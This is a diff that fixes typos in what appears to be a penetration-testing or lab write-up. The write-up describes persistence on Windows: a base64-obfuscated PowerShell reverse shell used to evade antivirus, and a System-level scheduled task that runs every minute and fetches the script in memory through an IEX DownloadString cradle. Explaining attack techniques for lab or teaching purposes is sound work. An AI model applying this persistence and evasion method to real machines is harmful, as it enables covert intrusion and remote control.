@@ -500,7 +500,7 @@ While they’re sneaky, download cradles can be detected with the right strategi
 -   So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)
 
 -   **Create our reverse-shell script**:
-    -   I use a base64 obfuscated powershell reverse shell as otherwise the AV was ablt to detect it. I like using <https://revshells.com> for this
+    -   I use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using <https://revshells.com> for this
         -   {{< figure src="/ox-hugo/2024-11-05-134155_.png" >}}
 
 -   **We then need to create our scheduled task**:
@@ -539,7 +539,7 @@ While they’re sneaky, download cradles can be detected with the right strategi
             -   `NoLogo -NonInteractive -ep bypass -nop`: PowerShell flags to suppress output and allow script execution bypassing restrictions.
             -   `IEX ((New-Object Net.WebClient).DownloadString(...))`: Uses `Invoke-Expression` to download and immediately execute the script.
             -   `/sc minute /mo 1`: Sets the task to run every 1 minute.
-            -   `/ru System`: Runs the task under `lSystem` privileges.
+            -   `/ru System`: Runs the task under `System` privileges.
 
 
 ## Lessons Learned: {#lessons-learned}
